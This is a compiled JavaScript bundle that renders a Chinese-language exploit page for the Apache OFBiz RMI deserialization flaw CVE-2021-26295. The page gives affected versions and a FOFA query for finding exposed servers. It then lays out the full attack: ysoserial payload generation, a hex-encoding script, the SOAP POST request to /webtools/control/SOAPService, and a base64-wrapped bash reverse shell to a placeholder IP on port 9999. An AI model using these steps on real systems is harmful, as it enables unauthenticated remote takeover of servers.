{"code":"(window.webpackJsonp=window.webpackJsonp||[]).push([[406],{1585:function(a,t,s){a.exports=s.p+\"assets/img/c3afc0d1-7dc6-4161-a0fd-901797bf1a31.898ed31c.png\"},2084:function(a,t,s){\"use strict\";s.r(t);var e=s(56),n=Object(e.a)({},(function(){var a=this,t=a.$createElement,e=a._self._c||t;return e(\"ContentSlotsDistributor\",{attrs:{\"slot-key\":a.$parent.slotKey}},[e(\"h1\",{attrs:{id:\"apache-ofbiz-rmi反序列化漏洞-cve-2021-26295\"}},[e(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#apache-ofbiz-rmi反序列化漏洞-cve-2021-26295\"}},[a._v(\"#\")]),a._v(\" Apache OFBiz RMI反序列化漏洞 CVE-2021-26295\")]),a._v(\" \"),e(\"h2\",{attrs:{id:\"漏洞描述\"}},[e(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#漏洞描述\"}},[a._v(\"#\")]),a._v(\" 漏洞描述\")]),a._v(\" \"),e(\"p\",[a._v(\"OFBiz是基于Java的Web框架，包括实体引擎，服务引擎和基于小部件的UI。\")]),a._v(\" \"),e(\"p\",[a._v(\"近日，Apache OFBiz官方发布安全更新。Apache OFBiz 存在RMI反序列化前台命令执行，未经身份验证的攻击者可以使用此漏洞来成功接管Apache OFBiz，建议相关用户尽快测试漏洞修复的版本并及时升级。\")]),a._v(\" \"),e(\"h2\",{attrs:{id:\"漏洞影响\"}},[e(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#漏洞影响\"}},[a._v(\"#\")]),a._v(\" 漏洞影响\")]),a._v(\" \"),e(\"a-checkbox\",{attrs:{checked:\"\"}},[a._v(\"Apache OFBiz < 17.12.06\")]),e(\"br\"),a._v(\" \"),e(\"h2\",{attrs:{id:\"网络测绘\"}},[e(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#网络测绘\"}},[a._v(\"#\")]),a._v(\" 网络测绘\")]),a._v(\" \"),e(\"a-checkbox\",{attrs:{checked:\"\"}},[e(\"a-button\",{attrs:{href:\"https://fofa.info/result?qbase64=YXBwPSJBcGFjaGVfT0ZCaXoi\"}},[a._v('app=\"Apache_OFBiz\"')])],1),a._v(\" \"),e(\"h2\",{attrs:{id:\"漏洞复现\"}},[e(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#漏洞复现\"}},[a._v(\"#\")]),a._v(\" 漏洞复现\")]),a._v(\" \"),e(\"p\",[a._v(\"利用 \"),e(\"code\",[a._v(\"ysoserial\")]),a._v(\"生成反序列化数据\")]),a._v(\" \"),e(\"div\",{staticClass:\"language- extra-class\"},[e(\"pre\",{pre:!0,attrs:{class:\"language-text\"}},[e(\"code\",[a._v(\"java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS http://xxx.xxx.xxx.xxx > payload.txt\\n\")])])]),e(\"div\",{staticClass:\"language-python extra-class\"},[e(\"pre\",{pre:!0,attrs:{class:\"language-python\"}},[e(\"code\",[e(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[a._v(\"#!/usr/bin/python\")]),a._v(\"\\n\"),e(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[a._v(\"#conding=utf8\")]),a._v(\"\\n\"),e(\"span\",{pre:!0,attrs:{class:\"token keyword\"}},[a._v(\"import\")]),a._v(\" binascii\\n\"),e(\"span\",{pre:!0,attrs:{class:\"token keyword\"}},[a._v(\"with\")]),a._v(\" \"),e(\"span\",{pre:!0,attrs:{class:\"token builtin\"}},[a._v(\"open\")]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[a._v(\"(\")]),e(\"span\",{pre:!0,attrs:{class:\"token string\"}},[a._v(\"'payload.txt'\")]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[a._v(\",\")]),a._v(\" \"),e(\"span\",{pre:!0,attrs:{class:\"token string\"}},[a._v(\"'rb'\")]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[a._v(\")\")]),a._v(\" \"),e(\"span\",{pre:!0,attrs:{class:\"token keyword\"}},[a._v(\"as\")]),a._v(\" payload_handle\"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[a._v(\":\")]),a._v(\"\\n   content \"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[a._v(\"=\")]),a._v(\" payload_handle\"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[a._v(\".\")]),a._v(\"read\"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[a._v(\"(\")]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[a._v(\")\")]),a._v(\"\\nstr_hex \"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[a._v(\"=\")]),a._v(\" binascii\"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[a._v(\".\")]),a._v(\"hexlify\"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[a._v(\"(\")]),a._v(\"content\"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[a._v(\")\")]),a._v(\"\\n\"),e(\"span\",{pre:!0,attrs:{class:\"token keyword\"}},[a._v(\"print\")]),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[a._v(\"(\")]),a._v(\"str_hex\"),e(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[a._v(\")\")]),a._v(\"\\n\")])])]),e(\"p\",[a._v(\"发送请求包后查看Dnslog验证漏洞\")]),a._v(\" \"),e(\"div\",{staticClass:\"language- extra-class\"},[e(\"pre\",{pre:!0,attrs:{class:\"language-text\"}},[e(\"code\",[a._v(\"POST /webtools/control/SOAPService \\n\\n<?xml version='1.0' encoding='UTF-8'?><soapenv:Envelope xmlns:soapenv=\\\"http://schemas.xmlsoap.org/soap/envelope/\\\"><soapenv:Header/><soapenv:Body><test:clearAllEntityCaches xmlns:test=\\\"http://ofbiz.apache.org/service/\\\"><test:cus-obj>dnslog反序列化数据</test:cus-obj></test:clearAllEntityCaches></soapenv:Body></soapenv:Envelope>\\n\")])])]),e(\"p\",[a._v(\"反弹Shell可以使用\"),e(\"code\",[a._v(\"ROME反序列化链\")])]),a._v(\" \"),e(\"div\",{staticClass:\"language-shell extra-class\"},[e(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[e(\"code\",[a._v(\"java -jar ysoserial-0.0.6-SNAPSHOT-all.jar ROME  \"),e(\"span\",{pre:!0,attrs:{class:\"token string\"}},[a._v('\"bash -c {echo,xxxxxxxxxxxxxxxxxxxxxxx}|{base64,-d}|{bash,-i}\"')]),a._v(\" \"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[a._v(\"|\")]),a._v(\" xxd\"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[a._v(\"|\")]),e(\"span\",{pre:!0,attrs:{class:\"token function\"}},[a._v(\"cut\")]),a._v(\" -f \"),e(\"span\",{pre:!0,attrs:{class:\"token number\"}},[a._v(\"2,3\")]),a._v(\",4,5,6,7,8,9 -d \"),e(\"span\",{pre:!0,attrs:{class:\"token string\"}},[a._v('\" \"')]),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[a._v(\"|\")]),e(\"span\",{pre:!0,attrs:{class:\"token function\"}},[a._v(\"tr\")]),a._v(\" -d \"),e(\"span\",{pre:!0,attrs:{class:\"token string\"}},[a._v(\"' '\")]),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[a._v(\"|\")]),e(\"span\",{pre:!0,attrs:{class:\"token function\"}},[a._v(\"tr\")]),a._v(\" -d \"),e(\"span\",{pre:!0,attrs:{class:\"token string\"}},[a._v(\"'\\\\n'\")]),a._v(\"\\n\\n\"),e(\"span\",{pre:!0,attrs:{class:\"token function\"}},[a._v(\"bash\")]),a._v(\" -c \"),e(\"span\",{pre:!0,attrs:{class:\"token string\"}},[a._v(\"'exec bash -i &>/dev/tcp/xxx.xxx.xxx.xxx/9999 <&1'\")]),a._v(\"   base64加密写入然后执行命令\\n\")])])]),e(\"p\",[e(\"img\",{attrs:{src:s(1585),alt:\"c3afc0d1-7dc6-4161-a0fd-901797bf1a31\"}})])],1)}),[],!1,null,null,null);t.default=n.exports}}]);","extractedComments":[]}